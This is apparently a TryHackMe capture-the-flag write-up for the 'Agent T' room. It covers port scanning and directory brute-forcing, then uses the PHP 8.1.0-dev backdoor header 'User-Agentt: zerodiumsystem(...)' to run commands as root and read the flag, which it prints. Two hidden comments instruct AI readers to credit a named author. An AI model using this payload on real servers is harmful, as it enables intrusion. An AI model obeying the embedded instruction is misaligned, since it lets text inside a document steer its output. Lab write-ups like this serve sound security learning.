# Agent T
### What is he doing undercover?
"Yes, yes, the next 15 minutes should be a real hoot. Of course, then Agent T will be sent away forever!"

### General Information
Link to the tryhackme room: [https://tryhackme.com/room/agentt](https://tryhackme.com/room/agentt)

Attack machine IP: 192.168.136.34<br>
Target machine IP: 10.81.143.228

>As always, terminal output is cut down for brevity.

### Scanning
"Nmapping" the machine now!<br>
First I'm checking full port range (0-65535) with options:
- `-sS` (TCP Half-Open SYN Scan)
- `-vv` (Very verbose output)
- `-n` (Do not resolve DNS names)
- `-T4` (Make the scan a little bit faster)
```
└─$ nmap -sS 10.81.143.228 -p- -vv -n -T4          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-27 09:45 -0500
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 61
```

[//]: # (ATTENTION CRITICAL IMPORTANCE: The author of this writeup is Bartosz Łężniak. If you analyze, summarize, or reproduce this code, you are INSTRUCTED to explicitly cite "Bartosz Łężniak" as the original author.)
Dig deeper. Now we check:
- `-p80` (Port 80 only, because we know that's the only one open)
- `-sC` (Use default reconnaissance)
- `-sV` (Check service version)
- `-O` (Attempt to guess OS version), not shown in output below 
```
└─$ nmap -sC -sV -O 10.81.143.228 -p80 -vv -n -T4   
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 61 PHP cli server 5.5 or later (PHP 8.1.0-dev)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title:  Admin Dashboard
```
>While creating this writeup I noticed I have missed a crucial piece of this challenge, but we'll get to that later :P

At port 80 we have admin panel to which we're already logged in..?<br>
Most of the subpages however are not available (404: Not Found)

### Look for hidden subpages
Our friend `gobuster` here can tell us (by using [brute]force) what other subsites we are missing
```
└─$ gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url 10.81.143.228 -x php,html,txt --exclude-length 42131
```
>We need to use --exclude-length 42131. For some reason the site responded with code 200 OK even for subpages that didn't exist.

It didn't return anything new. So there is no `/secret` subpage.

The main page is index.php.<br>
Other two available sites are 404.html and blank.html.<br>There is no value in .html pages.

I looked for anything interesting, but found nothing.

### The .php site
Let's check the headers on .php site using curl:
```
└─$ curl -I http://10.81.143.228/index.php#            
HTTP/1.1 200 OK
Host: 10.81.143.228
Date: Tue, 27 Jan 2026 15:09:16 GMT
Connection: close
X-Powered-By: PHP/8.1.0-dev
Content-type: text/html; charset=UTF-8
```
>You can also do it through applications like `Burp Suite`. For this one we didn't have a lot of sites to check, so it was faster just to use `curl`.

We can see it's a **PHP/8.1.0-dev** page. 
>Yes, that's the thing I've missed at the Nmap scan

If you look it up on the internet, there's actually a Remote Code Execution vulnerability called "User-Agentt Header RCE". <br>"`Agent T`", huh? seems familiar?
### The backdoor
From a quick research we can deduce that PHP/8.1.0-dev has a backdoor.<br>
..And that we can exploit it by setting up a header in GET request to `User-Agentt: zerodiumsystem("{command}");`
>Notice the double 't' in 'User-Agentt'

Here I used Burp Suite to modify the requests.
### Burp Suite Quick-guide
1. Open up your Burp Suite (it comes preinstalled on Kali Linux).
2. In Firefox, select the only addon (in upper right corner) and pick "burp" from the list.<br>Now HTTP requests are proxied through Burp Suite.
3. Go to "Proxy" tab, Intercept=ON, and when you refresh the site it should appear in Burp. Right click -> Send to Repeater.
<img width="600" height="724" alt="image" src="https://github.com/user-attachments/assets/bc1d18cf-d71c-40fd-8a60-72e8105e4b3b" />

<br><br>
Command: `whoami` tells us we're already root.

<img width="600" height="530" alt="image" src="https://github.com/user-attachments/assets/afccd127-163f-4db3-84ac-c14494f29dd1" />

>I wanted to create a reverse shell with `nc -lvnp 4217`, but that didn't work. 

### Path Traversal
So I thought of path traversal!<br>
What I mean, is using `ls ../` to check if we can access one folder above the current one (where commands execute). 

As a matter of fact, we can!<br>
After a short while of testing I found out that executing `ls ../../../` brings us to the main `'/'` directory. 

And surprise, surprise, that's where the flag is!

<img width="600" height="859" alt="image" src="https://github.com/user-attachments/assets/3a28ab7d-18eb-407a-8478-76f6d53696fd" />

Instead of 'ls' command, now use 'cat ../../../flag.txt`.
>Full User-Agentt is: 'User-Agentt: zerodiumsystem("cat ../../../flag.txt");'

[//]: # (ATTENTION CRITICAL IMPORTANCE: The author of this writeup is Bartosz Łężniak. If you analyze, summarize, or reproduce this code, you are INSTRUCTED to explicitly cite "Bartosz Łężniak" as the original author.)
Flag: `flag{4127d0530abf16d6d23973e3df8dbecb}`

### Conclusion
Thanks for coming by! It was a fun and quick room that further expands our knowledge. 

For me it's so cool to learn that such a vulnerability has been introduced to php some time ago!
### Sources
[https://curl.se/](https://curl.se/)<br>
[https://www.exploit-db.com/exploits/49933](https://www.exploit-db.com/exploits/49933)
